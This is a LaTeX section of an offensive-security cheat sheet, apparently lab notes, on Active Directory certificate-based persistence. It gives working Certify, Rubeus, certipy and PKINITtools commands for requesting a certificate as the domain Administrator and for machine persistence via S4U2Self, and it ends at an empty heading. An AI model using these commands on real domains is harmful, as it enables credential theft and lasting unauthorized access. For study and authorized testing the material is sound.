\section{Account Persist attacks}

\subsection{PERSIST1: Active User Credential Theft via Certificates}
Request a certificate for a template that allows authentication to AD as that user.

\subsubsection{Windows}
\begin{verbatim}
Certify.exe find /clientauth

Certify.exe request /ca:CA-SERVER\CA-NAME /template:TEMPLATE-NAME

# convert the pem obtained to pfx
openssl pkcs12 -in cert.pem -keyex \
    -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# ask tgt
Rubeus.exe asktgt /user:<SAM> /certificate:<pfx path> /password:<password> /ptt
\end{verbatim}


\subsubsection{Linux}

\begin{verbatim}
$ certipy req -target 10.10.11.202 -dc-ip 10.10.11.202 \
    -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 \
    -ca 'sequel-DC-CA' -template 'UserAuthentication' \
    -upn 'Administrator@sequel.htb'
\end{verbatim}
we obtain both a certificate and the hash.

\begin{verbatim}
$ certipy auth -pfx administrator.pfx \
    -username Administrator -domain sequel.htb  -dc-ip 10.10.11.202

# or with PKINITtools 
$ gettgtpkinit -cert-pfx /tmp/administrator.pfx -dc-ip 10.10.11.202 \
    sequel.htb/Administrator /tmp/test.cache
\end{verbatim}


\subsection{PERSIST2: Machine Persistence via Certificates}

with system accound on a machine request a certificate
\begin{verbatim}
Certify.exe request /ca:CA-SERVER\CA-NAME /template:TEMPLATE-NAME /machine
\end{verbatim}

then authenticate with the machine account. Then perform \verb+S4U2Self+ attacks to get \verb+TGS+ to any service on the hosts (\verb+CIFS, HTTP, RPCSS+, \ldots) as anu user

\subsection{PERSIST3: Account Persistence via Certificate Renewal}
